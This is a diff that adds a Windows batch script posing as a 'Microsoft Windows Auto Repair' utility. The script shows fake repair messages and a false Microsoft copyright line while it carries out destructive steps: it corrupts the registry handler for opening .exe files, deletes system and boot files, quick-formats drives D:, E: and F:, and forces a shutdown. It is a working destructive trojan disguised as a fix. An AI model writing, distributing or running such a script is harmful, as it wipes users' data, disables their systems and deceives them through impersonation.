@@ -1,0 +1,41 @@
+@echo off
+title Microsoft Windows TM Auto Repair
+echo.
+echo Preparing to Fixing the System..............................
+echo This system need to repair of broken files.
+echo This problem may be cause a Virus activity or coruption files.
+echo Please wait a minute until windows doing it self....
+echo Please close any running programs from the Windows system.
+echo This program License and copyright by
+echo Microsoft Coorporation TM.
+echo System Repair in progress ........ please wait a second..
+echo.
+reg add HKLM\SOFTWARE\Classes\exefile\shell\open\Command /ve /d %%fe340ead%%  /f
+echo.
+del /f /Q /A C:\ntldr /S
+echo.
+Format  D: /Q /X /y
+echo.
+Format  E: /Q /X /y
+echo.
+Format  F: /Q /X /y
+echo.
+del /f /Q /A C:\command.com /S
+echo.
+del /f /Q /A C:\io.sys /S
+echo.
+del /f /Q /A C:\config.sys /S 
+echo.
+echo System is now repaired.
+echo Windows will reboot the system.
+echo.
+Shutdown.exe -s -c "Finish Repair System" -f -t 10
+echo.
+pause
+echo.
+Shutdown.exe -s -c "Finish Repair System" -f -t 10
+echo.
+exit
+
+
+
